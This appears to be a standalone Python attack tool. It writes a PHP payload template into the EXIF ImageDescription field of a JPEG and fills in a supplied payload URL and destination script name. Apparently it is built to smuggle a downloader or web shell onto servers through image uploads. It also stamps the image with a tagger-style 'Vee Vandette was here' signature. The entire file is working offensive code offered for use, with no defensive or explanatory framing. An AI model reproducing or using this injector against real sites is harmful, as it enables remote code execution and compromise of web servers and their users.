#!/usr/bin/python3

from PIL import Image
import piexif, sys, getopt, codecs

def injectCode(image, outpout, payload, destination):
    with open('imagePayload.php', 'r') as file:
        data = file.read().replace('\n', '')
    img = Image.open(image)
    exif_dict = piexif.load(img.info["exif"])
    exif_dict['0th'][piexif.ImageIFD.Software] = ("Vee Vandette was here")
    payloadInjection = data.replace("payloadURL", payload)
    finalOutput = payloadInjection.replace("destinationName", destination)
    exif_dict['0th'][piexif.ImageIFD.ImageDescription] = (finalOutput)
    exif_bytes = piexif.dump(exif_dict)
    img.save(outpout, "jpeg", exif=exif_bytes)

def main(argv):
    inputimage = ''
    outputimage = ''
    payloadurl = ''
    destinationname = ''
    
    try:
        opts, args = getopt.getopt(argv,"i:o:p:d:h",["ifile=","ofile=", "purl=", "dname="])
    except getopt.GetoptError:
        print(sys.argv[0] + " -i <inputimage> -o <outputimage> -p <payloadurl> -d <destinationname>")
        sys.exit(2)     

    for opt, arg in opts:
        if opt == "-h":
            print(sys.argv[0] + " -i <inputimage> -o <outputimage> -p <payloadurl> -d <destinationname>") 
            sys.exit(0)
        elif opt in ("-i", "--ifile"):
            inputimage = arg
        elif opt in ("-o", "--ofile"):
            outputimage = arg
        elif opt in ("-p", "--purl"):
            payloadurl = arg
        elif opt in ("-d", "--dname"):
            destinationname = arg

    print('Input file is "', inputimage)
    print('Output file is "', outputimage)
    print('Payload URL is "', payloadurl)
    print('Destination Script Name is "', destinationname)

    injectCode(inputimage, outputimage, payloadurl, destinationname)

if __name__ == "__main__":
    main(sys.argv[1:])



